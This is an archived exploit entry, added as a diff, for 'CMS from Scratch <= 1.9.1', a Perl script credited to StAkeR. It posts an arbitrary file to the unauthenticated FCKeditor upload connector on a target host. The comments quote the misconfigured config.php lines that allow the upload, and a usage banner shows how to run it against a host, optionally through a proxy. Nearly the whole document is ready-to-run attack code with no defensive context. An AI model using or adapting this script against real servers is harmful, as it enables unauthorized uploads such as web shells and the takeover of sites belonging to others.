@@ -1,0 +1,156 @@
+id: 4778
+date: 02/03/2009
+title: CMS from Scratch <= 1.9.1 (fckeditor) Remote File Upload Exploit
+author: StAkeR
+cves: 
+
+================================================================
+CMS from Scratch <= 1.9.1 (fckeditor) Remote File Upload Exploit
+================================================================
+
+
+
+#!/usr/bin/perl 
+# ----------------------------------------------------------------
+# CMS from Scratch <= 1.9.1 (fckeditor) Remote File Upload Exploit
+# ----------------------------------------------------------------
+# (fckeditor/editor/filemanager/connectors/php/config.php)
+# 25. global $Config ;
+# 26.
+# 27. $Config['Enabled'] = (isset($_SESSION['loginStatus']) || 
+#     $_SESSION == NULL) ? true : false ;  
+# ...
+# 39. $Config['UserFilesAbsolutePath'] = 
+#     realpath($_SERVER['DOCUMENT_ROOT']);
+# ----------------------------------------------------------------
+
+use Getopt::Std;
+use LWP::UserAgent;
+
+getopts('p:',\my %opts);
+
+my $http = new LWP::UserAgent;
+my ($host,$file) = @ARGV;
+
+
+Main::RunExploit();
+
+
+# Main Package
+
+package Main;
+
+
+sub Usage {
+
+return print <<EOF;
++------------------------------------------------------------------+
+| CMS from Scratch <= 1.9.1 (fckeditor) Remote File Upload Exploit |
++------------------------------------------------------------------+
+by yeat - staker[at]hotmail[dot]it
+
+Usage: perl xpl.pl host/path file [OPTIONS]
+host: target host and cms path
+file: file to upload
+
+Options:
+
+-p [specify a proxy] [server]:[port]
+
+Example: 
+perl xpl.pl localhost/cms yeat.jpg
+perl xpl.pl localhost/cms yeat.jpg -p 213.151.89.109:80
+
+EOF
+
+}
+
+
+sub RunExploit 
+{    
+    if (defined $opts{p}) {
+        HTTP::Proxy($opts{p});
+    }
+    
+    if (@ARGV < 2 || @ARGV > 4) {
+        Main::Usage();
+    }
+    else {    
+        FileUpload::Exploit($file);
+    }    
+}
+
+
+
+# File Upload Package
+
+package FileUpload;
+
+sub Exploit 
+{
+    my $file = shift;
+    my $path = "/fckeditor/editor/filemanager/connectors/php/upload.php?Type=File";
+
+
+    my $data = { NewFile => [$file,$file] };
+    
+    my $send = $http->post('http://'.$host.$path,
+                           $data,
+                           Content_Type => 'multipart/form-data',
+                          );
+    
+    if ($send->is_success) {
+        print $send->content;
+        exit;                        
+    }
+    else {
+        print "Exploit Failed!\n";
+        exit;
+    }     
+}   
+                                 
+
+
+
+# HTTP Package
+
+package HTTP;
+
+
+sub Cookies 
+{
+    return $http->default_header('Cookie' => $_[0]);
+}
+
+
+sub UserAgent 
+{
+    return $http->agent($_[0]);
+}    
+
+
+sub GET 
+{    
+    if ($_[0] !~ m{^http://(.+?)$}i) {
+        return $http->get('http://'.$_[0]);
+    }    
+    else {
+        return $http->get($_[0]);
+    }    
+}
+    
+
+sub http_header 
+{
+    return $http->default_header($_[0]);
+}            
+
+    
+sub Proxy 
+{
+    return $http->proxy('http', 'http://'.$_[0]);   
+}   
+
+
+
+#  0day.today [2023-03-27]  #
